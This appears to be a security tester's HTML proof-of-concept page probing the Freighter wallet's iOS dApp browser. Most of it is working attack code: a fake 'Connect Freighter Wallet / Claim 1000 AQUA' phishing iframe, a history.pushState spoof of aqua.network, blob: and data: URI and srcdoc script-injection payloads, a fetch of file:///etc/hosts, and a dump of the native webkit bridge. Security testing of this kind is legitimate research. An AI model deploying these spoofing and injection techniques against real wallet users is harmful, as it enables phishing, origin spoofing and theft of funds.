<head>

<style>
body{font-family:monospace;padding:16px;background:#000;color:#0f0}

iframe{width:100%;height:300px;border:2px solid #0f0;margin-top:10px}

<body>
<h2>Freighter iOS dApp Browser - Test Pack</h2>
<p>Origin: <span id="origin"></span></p>

<h3>1. UI Spoof (yang di screenshot 11.40)</h3>
<iframe id="spoof" srcdoc="<h1 style='text-align:center'>AQUARIUS<br>Connect Freighter Wallet<br><button>Connect</button></h1><p>Claim 1000 AQUA</p>"></iframe>

<h3>2. pushState Spoof</h3>
<button onclick="testPushState()">Test pushState -> fake aqua.network</button>

<h3>3. blob: / data: URI Bypass</h3>
<button onclick="testBlob()">Test blob: navigation</button>
<button onclick="testData()">Test data: navigation</button>

<h3>4. srcdoc UXSS</h3>
<button onclick="testSrcdoc()">Test srcdoc alert(domain)</button>
<div id="srcdocBox"></div>

<h3>5. file:// test (safe)</h3>

<h3>6. webkit.messageHandlers check (iOS specific)</h3>
<button onclick="testBridge()">Dump window.webkit.messageHandlers</button>
<pre id="log"></pre>

<script>
document.getElementById('origin').innerText = location.origin + ' | ' + location.href;
const logEl = document.getElementById('log');
function log(t){ logEl.innerText += t + '\n'; console.log(t); }

function testPushState(){
  log('Before: ' + location.href);
  history.pushState({}, '', 'https://aqua.network/airdrop');
  log('After pushState: ' + location.href + ' - CEK ADDRESS BAR FREIGHTER!');
  setTimeout(()=>{ history.pushState({}, '', 'https://0x403for.github.io/spoof-pack.html'); log('Restored'); }, 3000);
}

function testBlob(){
  const blob = new Blob(['<h1>Fake via BLOB - if you see this in top frame, bug!</h1><script>alert(document.domain)</sc'+'ript>'], {type:'text/html'});
  const url = URL.createObjectURL(blob);
  log('Navigating to blob: ' + url);
  location.href = url;
}

function testData(){
  log('Navigating to data:text/html');
  location.href = 'data:text/html,<h1>Fake via DATA URI - bug if loaded</h1><script>alert(document.domain)</sc'+'ript>';
}

function testSrcdoc(){
  const box = document.getElementById('srcdocBox');
  box.innerHTML = '<iframe srcdoc="<script>alert(\'srcdoc XSS - domain: \'+document.domain)</sc'+'ript><h1>srcdoc</h1>"></iframe>';
  log('srcdoc injected - check alert domain');
}

function testFile(){
  log('Testing file:// fetch...');
  fetch('file:///etc/hosts').then(r=>r.text()).then(t=>{ log('file:// READ SUCCESS: ' + t.slice(0,100)); }).catch(e=>{ log('file:// blocked (good): ' + e); });
}

function testBridge(){
  log('--- webkit.messageHandlers ---');
  try{
    log(JSON.stringify(Object.keys(window.webkit.messageHandlers || {})));
    log(JSON.stringify(window.webkit, null, 2).slice(0,1000));
    // Cek freighter object
    log('window.freighter: ' + typeof window.freighter);
    log('window.freighterApi: ' + typeof window.freighterApi);
  }catch(e){ log('error: '+e); }
}

// Auto info pas load
log('Loaded at: ' + new Date().toISOString());
log('UserAgent: ' + navigator.userAgent);
</script>
